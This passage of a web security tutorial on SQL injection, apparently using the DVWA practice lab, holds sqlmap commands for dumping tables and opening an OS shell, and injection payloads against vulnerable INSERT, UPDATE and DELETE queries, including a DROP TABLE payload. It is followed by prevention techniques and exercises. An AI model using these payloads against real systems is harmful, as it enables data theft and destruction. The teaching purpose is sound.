</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;id=1&amp;Submit=Submit&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;security=medium; PHPSESSID=abc&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --tables <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --columns <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --dump
</span></span></code></pre></div><p><strong>OS Shell access:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://dvwa.local/vulnerabilities/sqli/&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;id=1&amp;Submit=Submit&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;security=medium; PHPSESSID=abc&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --os-shell
</span></span></code></pre></div><h3 id=step-6-sql-injection-in-different-contexts>Step 6: SQL Injection in Different Contexts<a hidden class=anchor aria-hidden=true href=#step-6-sql-injection-in-different-contexts>#</a></h3><h4 id=insert-statements>Insert Statements<a hidden class=anchor aria-hidden=true href=#insert-statements>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Vulnerable registration
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$username <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;username&#39;</span>];
</span></span><span style=display:flex><span>$email <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;email&#39;</span>];
</span></span><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;INSERT INTO users (username, email) VALUES (&#39;</span><span style=color:#e6db74>$username</span><span style=color:#e6db74>&#39;, &#39;</span><span style=color:#e6db74>$email</span><span style=color:#e6db74>&#39;)&#34;</span>;
</span></span></code></pre></div><p><strong>Exploitation:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>username: <span style=color:#66d9ef>admin</span><span style=color:#e6db74>&#39;, &#39;</span><span style=color:#66d9ef>admin</span><span style=color:#f92672>@</span>evil.com<span style=color:#e6db74>&#39;), (&#39;</span>hacker<span style=color:#e6db74>&#39;, &#39;</span>hacker<span style=color:#f92672>@</span>evil.com<span style=color:#e6db74>&#39;)--
</span></span></span></code></pre></div><h4 id=update-statements>Update Statements<a hidden class=anchor aria-hidden=true href=#update-statements>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Vulnerable profile update
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$name <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;name&#39;</span>];
</span></span><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;UPDATE users SET name=&#39;</span><span style=color:#e6db74>$name</span><span style=color:#e6db74>&#39; WHERE id=1&#34;</span>;
</span></span></code></pre></div><p><strong>Exploitation:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>name: John<span style=color:#e6db74>&#39;, role=&#39;</span><span style=color:#66d9ef>admin</span><span style=color:#e6db74>&#39; WHERE id=1--
</span></span></span></code></pre></div><h4 id=delete-statements>Delete Statements<a hidden class=anchor aria-hidden=true href=#delete-statements>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Vulnerable comment deletion
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$id <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;id&#39;</span>];
</span></span><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;DELETE FROM comments WHERE id=</span><span style=color:#e6db74>$id</span><span style=color:#e6db74>&#34;</span>;
</span></span></code></pre></div><p><strong>Exploitation:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>; <span style=color:#66d9ef>DROP</span> <span style=color:#66d9ef>TABLE</span> users<span style=color:#75715e>--
</span></span></span></code></pre></div><h3 id=step-7-prevention-techniques>Step 7: Prevention Techniques<a hidden class=anchor aria-hidden=true href=#step-7-prevention-techniques>#</a></h3><h4 id=method-1-prepared-statements-parameterized-queries>Method 1: Prepared Statements (Parameterized Queries)<a hidden class=anchor aria-hidden=true href=#method-1-prepared-statements-parameterized-queries>#</a></h4><p><strong>PHP with PDO:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Secure approach
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$username <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;username&#39;</span>];
</span></span><span style=display:flex><span>$password <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;password&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$stmt <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = ? AND password = ?&#34;</span>);
</span></span><span style=display:flex><span>$stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>([$username, $password]);
</span></span><span style=display:flex><span>$result <span style=color:#f92672>=</span> $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p><strong>Python with SQLite:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Secure approach</span>
</span></span><span style=display:flex><span>username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;username&#39;</span>]
</span></span><span style=display:flex><span>password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;password&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cursor <span style=color:#f92672>=</span> db<span style=color:#f92672>.</span>execute(
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = ? AND password = ?&#34;</span>,
</span></span><span style=display:flex><span>    (username, password)
</span></span><span style=display:flex><span>)
</span></span></code></pre></div><p><strong>Java with PreparedStatement:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// Secure approach</span>
</span></span><span style=display:flex><span>String username <span style=color:#f92672>=</span> request.<span style=color:#a6e22e>getParameter</span>(<span style=color:#e6db74>&#34;username&#34;</span>);
</span></span><span style=display:flex><span>String password <span style=color:#f92672>=</span> request.<span style=color:#a6e22e>getParameter</span>(<span style=color:#e6db74>&#34;password&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>String query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = ? AND password = ?&#34;</span>;
</span></span><span style=display:flex><span>PreparedStatement pst <span style=color:#f92672>=</span> connection.<span style=color:#a6e22e>prepareStatement</span>(query);
</span></span><span style=display:flex><span>pst.<span style=color:#a6e22e>setString</span>(1, username);
</span></span><span style=display:flex><span>pst.<span style=color:#a6e22e>setString</span>(2, password);
</span></span><span style=display:flex><span>ResultSet rs <span style=color:#f92672>=</span> pst.<span style=color:#a6e22e>executeQuery</span>();
</span></span></code></pre></div><h4 id=method-2-stored-procedures>Method 2: Stored Procedures<a hidden class=anchor aria-hidden=true href=#method-2-stored-procedures>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- Create stored procedure
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>DELIMITER</span> <span style=color:#f92672>//</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>CREATE</span> <span style=color:#66d9ef>PROCEDURE</span> GetUser(<span style=color:#66d9ef>IN</span> username VARCHAR(<span style=color:#ae81ff>50</span>), <span style=color:#66d9ef>IN</span> password VARCHAR(<span style=color:#ae81ff>50</span>))
</span></span><span style=display:flex><span><span style=color:#66d9ef>BEGIN</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>FROM</span> users <span style=color:#66d9ef>WHERE</span> username <span style=color:#f92672>=</span> username <span style=color:#66d9ef>AND</span> password <span style=color:#f92672>=</span> password;
</span></span><span style=display:flex><span><span style=color:#66d9ef>END</span> <span style=color:#f92672>//</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>DELIMITER</span> ;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Call stored procedure
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$stmt <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;CALL GetUser(?, ?)&#34;</span>);
</span></span><span style=display:flex><span>$stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>([$username, $password]);
</span></span></code></pre></div><h4 id=method-3-input-validation>Method 3: Input Validation<a hidden class=anchor aria-hidden=true href=#method-3-input-validation>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Whitelist validation
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>validateUsername</span>($username) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Only allow alphanumeric and underscores, 3-20 characters
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^[a-zA-Z0-9_]{3,20}$/&#39;</span>, $username)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Invalid username format&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $username;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$username <span style=color:#f92672>=</span> <span style=color:#a6e22e>validateUsername</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Additional escaping (not sufficient alone)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$username <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_real_escape_string</span>($connection, $username);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><h4 id=method-4-escaping-least-preferred>Method 4: Escaping (Least Preferred)<a hidden class=anchor aria-hidden=true href=#method-4-escaping-least-preferred>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Only use as secondary defense
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$username <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_real_escape_string</span>($connection, $_POST[<span style=color:#e6db74>&#39;username&#39;</span>]);
</span></span><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = &#39;</span><span style=color:#e6db74>$username</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><h3 id=step-8-advanced-prevention-techniques>Step 8: Advanced Prevention Techniques<a hidden class=anchor aria-hidden=true href=#step-8-advanced-prevention-techniques>#</a></h3><h4 id=principle-of-least-privilege>Principle of Least Privilege<a hidden class=anchor aria-hidden=true href=#principle-of-least-privilege>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- Create limited database user
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>CREATE</span> <span style=color:#66d9ef>USER</span> <span style=color:#e6db74>&#39;webapp&#39;</span><span style=color:#f92672>@</span><span style=color:#e6db74>&#39;localhost&#39;</span> IDENTIFIED <span style=color:#66d9ef>BY</span> <span style=color:#e6db74>&#39;strongpassword&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>GRANT</span> <span style=color:#66d9ef>SELECT</span>, <span style=color:#66d9ef>INSERT</span>, <span style=color:#66d9ef>UPDATE</span> <span style=color:#66d9ef>ON</span> webapp_db.<span style=color:#f92672>*</span> <span style=color:#66d9ef>TO</span> <span style=color:#e6db74>&#39;webapp&#39;</span><span style=color:#f92672>@</span><span style=color:#e6db74>&#39;localhost&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>-- No DROP, ALTER, or file operations
</span></span></span></code></pre></div><h4 id=web-application-firewall-waf>Web Application Firewall (WAF)<a hidden class=anchor aria-hidden=true href=#web-application-firewall-waf>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span><span style=color:#75715e># ModSecurity rule example</span>
</span></span><span style=display:flex><span>SecRule REQUEST_URI <span style=color:#e6db74>&#34;@detectSQLi&#34;</span> \
</span></span><span style=display:flex><span>  <span style=color:#960050;background-color:#1e0010>&#34;</span>id:1000,\
</span></span><span style=display:flex><span>  phase:2,\
</span></span><span style=display:flex><span>  deny,\
</span></span><span style=display:flex><span>  msg:&#39;SQL Injection Attack Detected&#39;<span style=color:#960050;background-color:#1e0010>&#34;</span>
</span></span></code></pre></div><h4 id=database-activity-monitoring>Database Activity Monitoring<a hidden class=anchor aria-hidden=true href=#database-activity-monitoring>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- Enable query logging
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>SET</span> <span style=color:#66d9ef>GLOBAL</span> general_log <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ON&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>SET</span> <span style=color:#66d9ef>GLOBAL</span> general_log_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/var/log/mysql/mysql.log&#39;</span>;
</span></span></code></pre></div><h3 id=step-9-testing-for-sql-injection>Step 9: Testing for SQL Injection<a hidden class=anchor aria-hidden=true href=#step-9-testing-for-sql-injection>#</a></h3><p><strong>Manual Testing Checklist:</strong></p><ol><li>Test all input fields (GET, POST, headers, cookies)</li><li>Test special characters: `&rsquo; " ; ) &ndash; /* */ @@</li><li>Test different SQL keywords: UNION, SELECT, INSERT, DROP</li><li>Test time-based attacks: SLEEP(), WAITFOR DELAY</li><li>Test boolean conditions: AND 1=1, OR 1=1</li><li>Test for error-based injection</li></ol><p><strong>Automated Testing:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># SQLMap scan</span>
</span></span><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://target.com/page.php?param=value&#34;</span> --batch
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Burp Suite Scanner</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Enable active scanner for SQLi vulnerabilities</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># OWASP ZAP</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Scan for SQL injection vulnerabilities</span>
</span></span></code></pre></div><p><strong>Code Review Checklist:</strong></p><p>‚úì Are queries using prepared statements?
‚úì Is input being validated?
‚úì Are error messages sanitized?
‚úì Is least privilege enforced?
‚úì Is sensitive data encrypted?
‚úì Are logs being monitored?</p><h2 id=best-practices>Best Practices<a hidden class=anchor aria-hidden=true href=#best-practices>#</a></h2><div class="callout callout-success"><div class=callout-title>Best Practices</div>Follow these best practices to prevent SQL injection:</div>1. **Always Use Prepared Statements**
- Never concatenate user input into SQL queries
- Use parameterized queries for all dynamic SQL
- Pass user input as parameters, not as part of the query string<ol start=2><li><p><strong>Validate and Sanitize Input</strong></p><ul><li>Use whitelist validation (allow only expected characters)</li><li>Apply input filters for special characters</li><li>Reject invalid input, don&rsquo;t try to &ldquo;fix&rdquo; it</li></ul></li><li><p><strong>Implement Defense in Depth</strong></p><ul><li>Use prepared statements as primary defense</li><li>Add input validation as secondary layer</li><li>Use least privilege for database users</li><li>Implement WAF for additional protection</li></ul></li><li><p><strong>Error Handling</strong></p><ul><li>Never display database errors to users</li><li>Log errors securely on the server</li><li>Return generic error messages to clients</li></ul></li><li><p><strong>Regular Testing</strong></p><ul><li>Include SQLi tests in security assessments</li><li>Use automated scanning tools regularly</li><li>Perform code reviews focusing on database queries</li></ul></li></ol><h2 id=common-mistakes>Common Mistakes<a hidden class=anchor aria-hidden=true href=#common-mistakes>#</a></h2><div class="callout callout-danger"><div class=callout-title>Common Mistakes to Avoid</div></div>### Mistake 1: Using String Concatenation<p><strong>Incorrect:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = &#39;&#34;</span> <span style=color:#f92672>.</span> $_POST[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>;
</span></span></code></pre></div><p><strong>Correct:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$stmt <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = ?&#34;</span>);
</span></span><span style=display:flex><span>$stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>([$_POST[<span style=color:#e6db74>&#39;username&#39;</span>]]);
</span></span></code></pre></div><h3 id=mistake-2-relying-only-on-input-escaping>Mistake 2: Relying Only on Input Escaping<a hidden class=anchor aria-hidden=true href=#mistake-2-relying-only-on-input-escaping>#</a></h3><p><strong>Explanation:</strong>
Escaping is not sufficient as the primary defense because:</p><ul><li>Different contexts need different escaping rules</li><li>Escaping can be bypassed with encoding</li><li>Prepared statements are more reliable</li></ul><p><strong>Correct Approach:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Use prepared statements + validation
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>validateInput</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>])) {
</span></span><span style=display:flex><span>    $stmt <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = ?&#34;</span>);
</span></span><span style=display:flex><span>    $stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>([$_POST[<span style=color:#e6db74>&#39;username&#39;</span>]]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=mistake-3-over-permissive-database-users>Mistake 3: Over-Permissive Database Users<a hidden class=anchor aria-hidden=true href=#mistake-3-over-permissive-database-users>#</a></h3><p><strong>Explanation:</strong>
If the web application user has excessive privileges, a successful SQL injection can lead to database destruction or data theft.</p><p><strong>Correct Approach:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#75715e>-- Create least privilege user
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>CREATE</span> <span style=color:#66d9ef>USER</span> <span style=color:#e6db74>&#39;webapp&#39;</span><span style=color:#f92672>@</span><span style=color:#e6db74>&#39;localhost&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>GRANT</span> <span style=color:#66d9ef>SELECT</span>, <span style=color:#66d9ef>INSERT</span>, <span style=color:#66d9ef>UPDATE</span> <span style=color:#66d9ef>ON</span> webapp_db.users <span style=color:#66d9ef>TO</span> <span style=color:#e6db74>&#39;webapp&#39;</span><span style=color:#f92672>@</span><span style=color:#e6db74>&#39;localhost&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>-- NO DROP, ALTER, FILE, SUPER privileges
</span></span></span></code></pre></div><h2 id=troubleshooting>Troubleshooting<a hidden class=anchor aria-hidden=true href=#troubleshooting>#</a></h2><div class="callout callout-info"><div class=callout-title>Frequently Asked Questions</div></div>### Q: What's the difference between parameterized queries and prepared statements?<p><strong>A:</strong> They are the same thing. &ldquo;Prepared statement&rdquo; is the SQL term, and &ldquo;parameterized query&rdquo; is the programming term for the same concept.</p><h3 id=q-can-i-use-stored-procedures-instead-of-prepared-statements>Q: Can I use stored procedures instead of prepared statements?<a hidden class=anchor aria-hidden=true href=#q-can-i-use-stored-procedures-instead-of-prepared-statements>#</a></h3><p><strong>A:</strong> Yes, but with caveats:</p><ul><li>Input validation is still needed</li><li>Dynamic SQL in stored procedures is still vulnerable</li><li>Ensure stored procedures themselves don&rsquo;t use dynamic SQL</li></ul><h3 id=q-do-orms-object-relational-mappers-prevent-sql-injection>Q: Do ORMs (Object-Relational Mappers) prevent SQL injection?<a hidden class=anchor aria-hidden=true href=#q-do-orms-object-relational-mappers-prevent-sql-injection>#</a></h3><p><strong>A:</strong> Mostly yes, if used correctly:</p><ul><li>Most ORMs use prepared statements automatically</li><li>Still vulnerable if using raw queries or string concatenation</li><li>Be careful with <code>raw()</code> methods or query builders</li></ul><h3 id=q-what-about-nosql-databases>Q: What about NoSQL databases?<a hidden class=anchor aria-hidden=true href=#q-what-about-nosql-databases>#</a></h3><p><strong>A:</strong> NoSQL databases have different injection risks:</p><ul><li>MongoDB: Operator injection ($ne, $where, etc.)</li><li>Still need input validation and parameterized queries</li><li>Each database has specific injection techniques</li></ul><h2 id=hands-on-exercise>Hands-On Exercise<a hidden class=anchor aria-hidden=true href=#hands-on-exercise>#</a></h2><div class="callout callout-success"><div class=callout-title>Practice Exercise</div>Practice finding and fixing SQL injection vulnerabilities:</div>### Exercise Setup<ol><li><strong>Install DVWA:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git clone https://github.com/digininja/DVWA.git
</span></span></code></pre></div><ol start=2><li><strong>Configure database:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mysql -u root -p
</span></span><span style=display:flex><span>CREATE DATABASE dvwa;
</span></span><span style=display:flex><span>CREATE USER <span style=color:#e6db74>&#39;dvwa&#39;</span>@<span style=color:#e6db74>&#39;localhost&#39;</span> IDENTIFIED BY <span style=color:#e6db74>&#39;password&#39;</span>;
</span></span><span style=display:flex><span>GRANT ALL ON dvwa.* TO <span style=color:#e6db74>&#39;dvwa&#39;</span>@<span style=color:#e6db74>&#39;localhost&#39;</span>;
</span></span></code></pre></div><h3 id=exercise-tasks>Exercise Tasks<a hidden class=anchor aria-hidden=true href=#exercise-tasks>#</a></h3><p><strong>Task 1: Detection</strong></p><ul><li>Use Burp Suite to find SQL injection in DVWA</li><li>Classify the type of SQL injection found</li></ul><p><strong>Task 2: Exploitation</strong></p><ul><li>Extract database version and user</li><li>List all tables in the database</li><li>Extract usernames and passwords from users table</li></ul><p><strong>Task 3: Prevention</strong></p><ul><li>Fix the vulnerable code using prepared statements</li><li>Add input validation</li><li>Test that the fix works</li></ul><h3 id=expected-results>Expected Results<a hidden class=anchor aria-hidden=true href=#expected-results>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># SQLMap output example</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing connection to the target URL
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#66d9ef>if</span> the target is protected by WAF/IPS
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#66d9ef>if</span> parameter <span style=color:#e6db74>&#39;id&#39;</span> is dynamic
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> parameter <span style=color:#e6db74>&#39;id&#39;</span> appears to be dynamic
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> heuristic <span style=color:#f92672>(</span>basic<span style=color:#f92672>)</span> test shows that parameter <span style=color:#e6db74>&#39;id&#39;</span> might be injectable
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing <span style=color:#66d9ef>for</span> SQL injection on parameter <span style=color:#e6db74>&#39;id&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing UNION query <span style=color:#f92672>(</span>information_schema<span style=color:#f92672>)</span> on parameter <span style=color:#e6db74>&#39;id&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> parameter <span style=color:#e6db74>&#39;id&#39;</span> is <span style=color:#e6db74>&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span> injectable
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing MySQL &gt;<span style=color:#f92672>=</span> 5.0 boolean-based blind - Parameter replace
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> parameter <span style=color:#e6db74>&#39;id&#39;</span> is <span style=color:#e6db74>&#39;MySQL &gt;= 5.0 boolean-based blind - Parameter replace (original query)&#39;</span> injectable
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing MySQL &gt;<span style=color:#f92672>=</span> 5.0 UNION query <span style=color:#f92672>(</span>information_schema<span style=color:#f92672>)</span> - WHERE or HAVING clause
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> parameter <span style=color:#e6db74>&#39;id&#39;</span> is <span style=color:#e6db74>&#39;MySQL &gt;= 5.0 UNION query (information_schema) - WHERE or HAVING clause&#39;</span> injectable
